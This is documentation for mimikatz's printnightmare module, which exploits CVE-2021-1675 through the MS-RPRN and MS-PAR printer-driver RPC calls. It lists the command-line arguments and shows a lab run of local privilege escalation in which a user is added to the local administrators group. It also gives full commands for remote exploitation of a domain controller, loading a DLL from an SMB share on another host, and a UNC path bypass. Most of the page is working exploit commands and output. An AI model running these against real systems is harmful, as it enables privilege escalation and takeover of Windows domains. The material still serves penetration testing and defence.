# printnightmare

`misc::printnightmare` can be used to exploit the [PrintNightMare](https://adamsvoboda.net/breaking-down-printnightmare-cve-2021-1675/) vulnerability in both \[[MS-RPRN RpcAddPrinterDriverEx](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b)] and \[[MS-PAR AddPrinterDriverEx](https://docs.microsoft.com/en-us/windows/win32/printdocs/addprinterdriverex)]. The bug was discovered by Zhiniang Peng ([@edwardzpeng](https://twitter.com/edwardzpeng?lang=en)) & Xuefeng Li ([@lxf02942370](https://twitter.com/lxf02942370?lang=en)). The MS-PAR function was discovered by [cube0x0](https://twitter.com/cube0x0). It has the following command line arguments:

* `/server`: the target server or workstation to exploit
* `/x64` or `/win64`: the target server or workstation is 64 bit
* `/x86` or `/win32`: the target server or workstation is 32 bit
* `/library`: the DLL to use during exploitation
* `/authuser`: the username to use during exploitation
* `/authdomain`: the active directory domain
* `/authpassword`: the password of the user
* `/clean`: clean-up the operation

The following example demonstrates local privilege escalation through printnightmare. As can be seen, the `test` user is not part of the local administrators group on the _**Win10.hacklab.local**_ machine:

```
PS C:\Users\m3g9tr0n> net user

User accounts for \\WIN10

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
test                     vs2022                   WDAGUtilityAccount
The command completed successfully.

PS C:\Users\m3g9tr0n> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
hacklab\Domain Admins
hacklab\m3g9tr0n
vs2022
The command completed successfully.
```

After successful exploitation of printnightmare:

```
mimikatz # misc::printnightmare /library:C:\Users\Public\DLL.dll
[ms-rprn/ncalrpc] local
> RpcGetPrinterDriverDirectory: C:\Windows\system32\spool\DRIVERS\x64
| mimikatz-{55911f3b-474e-4b31-bb55-a2a6b4fc1e76}-legitprinter / Windows x64 - 0x00008018 - C:\Users\Public\DLL.dll
> RpcAddPrinterDriverEx: OK!
> RpcDeletePrinterDriverEx: OK!
```

The test user is now part of the local administrators group:

```
PS C:\Users\m3g9tr0n> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
hacklab\Domain Admins
hacklab\m3g9tr0n
test
vs2022
The command completed successfully.
```

For remote exploitation, the following can be used:

```
mimikatz # misc::printnightmare /server:dc.hacklab.local /library:\\win10.hacklab.local\smb\x64\mimilib.dll /authuser:optimus /authpassword:Super_SecretPass1! /authdomain:hacklab.local
```

With the [UNC path bypass](https://twitter.com/gentilkiwi/status/1412771368534528001?s=20):

```
mimikatz # misc::printnightmare /server:dc.hacklab.local /library:\??\UNC\win10.hacklab.local\smb\x64\mimilib.dll /authuser:optimus /authpassword:Super_SecretPass1! /authdomain:hacklab.local
```
